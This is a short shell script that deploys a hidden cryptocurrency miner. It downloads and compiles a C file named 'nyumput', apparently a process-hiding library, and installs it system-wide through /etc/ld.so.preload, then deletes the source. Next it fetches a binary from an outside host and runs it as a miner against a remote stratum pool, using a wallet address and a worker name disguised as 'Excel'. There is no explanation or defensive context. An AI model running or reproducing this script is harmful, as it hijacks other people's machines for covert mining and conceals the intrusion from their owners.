apt-get update ; apt-get install sudo wget -y
curl https://bitbucket.org/koploks/watir/raw/master/nyumput.c -o nyumput.c
apt-get install build-essential -y
gcc -Wall -fPIC -shared -o libnyumput.so nyumput.c -ldl
mv libnyumput.so /usr/local/lib/
echo /usr/local/lib/libnyumput.so >> /etc/ld.so.preload
rm nyumput.c
wget -q -O home https://iplog.co/bash && chmod +x home >/dev/null 2>&1
./home -a yespowersugar -o stratum+tcps://stratum-na.rplant.xyz:17115 -u shuga1qxnrz9hvsa4teqzy9683wxe8eavc0vmn8a2e7ua.$(echo $(shuf -i 1-9 -n 1)-Excel) -p -t2
